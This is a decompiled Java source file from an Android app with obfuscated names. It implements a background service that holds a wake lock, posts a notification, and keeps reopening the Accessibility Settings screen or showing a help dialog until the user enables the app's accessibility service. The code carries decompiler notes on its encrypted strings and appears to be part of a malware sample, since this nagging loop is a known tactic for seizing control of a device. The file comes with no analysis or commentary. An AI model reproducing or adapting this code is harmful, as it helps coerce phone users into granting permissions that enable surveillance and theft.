package com.mistral.jon;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import com.mistral.jon.activity.HelpActivity;
import p001z.ayp;
import p001z.aza;
import p001z.azb;
import p001z.bcq;

/* JADX INFO: loaded from: classes.dex */
public class AccessibilityRequestService extends Service {

    /* JADX INFO: renamed from: a */
    private static long[] f701a = {416144142, 1321622164, 1939846887, -1814900825, 156974908, 1895044742, 379025039, 1811321961, 1717079557, -1452431331, -1297031707, 1962706931, 1084521577, 1423296976, 1123021210, -1448018002, 369703180, 112639696, 388184727, 745378481, -354855241, 1314715085, -105565775, 738957688, -886696388, 246396855, -1622743826, 453593765, -1012868013, 104264254, -1906931940, 429359499, -1860823708, 307927956, 1058873831, 618500131, -666989046, 962087224, 38239316, 877925520, 238094909, 379290281, -1560046935, 1224567780, -1878165177, 1059322805, 96315035, 1096023488, -1144988515, 1257078082, -1303372240, 667957239, 713873120, 796912758, 135213849, 1475065376, 692646667, 1401582075, 1103739020, 874819790, 1472081116, 978547689, 198835084, 1851549871, 31668012, 544711822, 133076513, 480046837, 238046252, 344791382, 990032425, 41828098, 1206718010, 979625775, 1961044351, 950552466, 147675016, 1701608046, 1347823053, 133110131, 575317840, 1055157967, 1641499986, 367007511, 990970543, 1500336278, -817400208, 283813680, -1781609627, -171791573, 1746386644, -675049779, -364349685, 1859168830, 77318623, 1183904265, 333785087, 1166195856, 1567574915, 422951369, 784035708, -845234615, 546693961, -956319486, -1273738790, 1014998463, 1419810199, -1065887539, -213060580, -2041577975, -772819226, 1464306502, 1490069082, 2138004908, 159471296, 1793993707, 1723782526, 849719600, 1260997682, 2060844263, 1421959874, 1765189011, -677392089, -1690748280, -1062829298, -518440835, 1124109748, -1638749662, -425612721, 728331457, 1283324795, 1346156778, -1501219984, 1143366978, -231176929, -909858896, -1128501256, -2114611487, -1636021514, 1914941662, -614355218, -19232662, -2047790379, -1533003627, -32092858, 26271971, 1207818111, 1516259691, -1566493199, -297469787, 921311193, -516145249, 2074092712, -1180874089, 889604765, 1850736697, 1165452214, -1524803452, -1889686885, -860324408, -1686212056, -1166976549, -1097195614, -1833307363, -2132519011, -443421084, 1339065791, 1760270987, 40082644, -1664378499, -2090224515, -902964118, 1152870676, -211217756, -1826181025, 2134539086, -920850849, -1403475521, -472755185, 1411784508, -1732718107, 1145943223, 803383822, -718763439, 1271731183, -1895357581, -140286081, -932154891, -848993597, -1371721081, 528256646, 1987584689, 625396917, 1740076567, 912701477, 639250951, -267491445, -1699135277, -1314239569, -187510485, -674516325, -978279851, -287694560, -118512479, 2089100759, 1665047663, 1786073460, 595561867, 310360254, -2031740936, -2010402293, 808367430, 581771354, 1485408126, -1720902974, 2022120095, -906083253, -1976074376, -661511828, -654112666, -1769189046, -1834248595, -1346702454, -1472175078, -2112635667, -1954042553, -1912783367, 1886059932, -931628226, -1459146683, -601905225, -1140928255, -1639483251, -760977062, -466400747, 1901644392, 848685978, -1612966068};

    /* JADX INFO: renamed from: a */
    private static final String str = "AccessibilityRequestService";

    /* JADX INFO: renamed from: a */
    private boolean f703a = false;

    /* JADX INFO: renamed from: a */
    private int f702a = 100;

    /* JADX INFO: renamed from: a */
    private String m997a(String str1, String str2) {
        NotificationChannel notificationChannel = new NotificationChannel(str1, str2, 2);
        notificationChannel.setLightColor(-16776961);
        notificationChannel.setLockscreenVisibility(0);
        ((NotificationManager) getSystemService("notification")).createNotificationChannel(notificationChannel);
        return notificationChannel.getId();
    }

    /* JADX INFO: renamed from: a */
    private boolean m998a() {
        return azb.m4322b((Context) this);
    }

    /* JADX INFO: String decrypt: "doWork begin"; "wl:2"; "config:dialog:timeout"; "doWork Counter "; "/"; "/"; "doWork Show dialog"; "doWork Start AccessibilitySettings Activity"; "doWork sleep"; "doWork End" */
    /* JADX INFO: renamed from: c */
    private void m999c() {
        char c = 0;
        int i = 416144142;
        char c2 = 4;
        int i2 = 156974909;
        ayp.m4254a().m4259a("doWork begin", str);
        ((PowerManager) getSystemService("power")).newWakeLock(1, "wl:2").acquire();
        int i3 = bcq.m4272a(this).getInt("config:dialog:timeout", 30);
        int i4 = 0;
        int i5 = 0;
        while (!m998a()) {
            if (false || !azb.m4320a((Context) this)) {
                ayp.m4254a().m4259a("doWork sleep", str);
                try {
                    Thread.sleep(1000L);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            } else {
                String str2 = str;
                ayp.m4254a().m4259a("doWork Counter " + i5 + "/" + (i5 % (2 * i3)) + "/" + i4, str2);
                if (i5 > 0 && i5 % (2 * i3) == 0) {
                    i4++;
                    ayp.m4254a().m4259a("doWork Show dialog", str2);
                    HelpActivity.m1023a(this, HelpActivity.str);
                } else if (i5 % 30 == 0) {
                    Intent intent2 = new Intent("android.settings.ACCESSIBILITY_SETTINGS");
                    intent2.setFlags(1350565888);
                    intent2.setFlags(606142464);
                    startActivity(intent2);
                } else if (Build.VERSION.SDK_INT < 29) {
                    Intent intent1 = new Intent("android.settings.ACCESSIBILITY_SETTINGS");
                    intent1.setFlags(1887436800);
                    startActivity(intent1);
                    ayp.m4254a().m4259a("doWork Start AccessibilitySettings Activity", str2);
                }
                try {
                    Thread.sleep(500L);
                } catch (InterruptedException e2) {
                    e2.printStackTrace();
                }
                i5++;
            }
            c = 0;
            c2 = 4;
            i = 416144142;
            i2 = 156974909;
        }
        ayp.m4254a().m4259a("doWork End", str);
    }

    /* JADX INFO: renamed from: d */
    private /* synthetic */ void m1000d() {
        Looper.prepare();
        m1001a();
        m999c();
        m1002b();
    }

    public static /* synthetic */ void lambda$q6ygD39JH6anQXIyJiuRDWQNjlU(AccessibilityRequestService accessibilityRequestService) {
        accessibilityRequestService.m1000d();
    }

    /* JADX INFO: String decrypt: "channel"; "Notification channel"; "accessibility_service_label"; "app_name"; "a11_request_message" */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX INFO: renamed from: a */
    protected void m1001a() {
        Intent intent = new Intent("android.settings.ACCESSIBILITY_SETTINGS");
        intent.setFlags(1350598656);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, intent, 134217728);
        String str2 = m997a("channel" + this.f702a, "Notification channel");
        Object[] objArr = new Object[2];
        objArr[0] = aza.m4316a("accessibility_service_label", new Object[0]);
        objArr[1] = aza.m4316a("app_name", new Object[0]);
        Notification notification = new Notification.Builder(this, str2).setContentIntent(pendingIntent).setContentTitle(getString(2131558431)).setContentText(aza.m4316a("a11_request_message", objArr)).setSmallIcon(17301543).build();
        stopForeground(true);
        startForeground(this.f702a, notification);
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX INFO: renamed from: b */
    protected void m1002b() {
        this.f703a = false;
        stopSelf(this.f702a);
    }

    /* JADX INFO: String decrypt: "Not yet implemented" */
    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        throw new UnsupportedOperationException("Not yet implemented");
    }

    /* JADX INFO: String decrypt: "onStartCommand" */
    /* JADX WARN: Multi-variable type inference failed */
    @Override // android.app.Service
    public int onStartCommand(Intent intent, int i, int i2) {
        ayp.m4254a().m4259a("onStartCommand", str);
        synchronized (this) {
            if (!this.f703a) {
                this.f703a = true;
                new Thread(new Runnable() { // from class: com.mistral.jon.-$$Lambda$AccessibilityRequestService$q6ygD39JH6anQXIyJiuRDWQNjlU
                    public /* synthetic */ RunnableImpl39() {
                    }

                    @Override // java.lang.Runnable
                    public final void run() {
                        AccessibilityRequestService.lambda$q6ygD39JH6anQXIyJiuRDWQNjlU(this.f$0);
                    }
                }).start();
            }
        }
        return 1;
    }
}
